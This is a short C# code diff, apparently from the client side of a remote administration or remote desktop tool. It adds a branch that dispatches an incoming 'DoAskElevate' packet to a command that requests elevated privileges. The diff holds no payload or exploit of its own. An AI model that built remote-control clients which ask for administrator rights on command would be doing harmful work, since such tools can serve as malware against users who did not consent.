@@ -9,7 +9,11 @@ namespace Client.Packets
         {
             var type = packet.Type;
 
-            if (type == TypePackets.GetMonitors)
+            if(type == TypePackets.DoAskElevate)
+            {
+                CommandController.doAskElevate((DoAskElevate)packet, client);
+            }
+            else if (type == TypePackets.GetMonitors)
             {
                 RemoteDesktopController.getMonitors(client);
             }
